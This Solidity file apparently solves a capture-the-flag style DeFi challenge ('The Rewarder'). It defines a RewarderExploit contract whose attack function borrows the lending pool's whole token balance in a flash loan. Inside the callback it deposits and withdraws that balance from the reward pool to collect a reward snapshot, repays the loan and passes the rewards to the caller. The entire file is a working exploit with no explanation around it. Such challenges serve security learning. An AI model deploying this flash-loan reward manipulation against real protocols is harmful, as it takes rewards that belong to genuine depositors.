// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RewarderExploit {
    IERC20 token;
    IERC20 reward;
    FlashLoanerPool pool;
    TheRewarderPool rewardPool;

    constructor(
        address _pool,
        address _token,
        address _rewardPool,
        address _reward
    ) {
        pool = FlashLoanerPool(_pool);
        token = IERC20(_token);
        reward = IERC20(_reward);
        rewardPool = TheRewarderPool(_rewardPool);
    }

    function attack() public {
        pool.flashLoan(token.balanceOf(address(pool)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        token.approve(address(rewardPool), _amount);
        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);

        token.transfer(address(pool), _amount);
    }
}
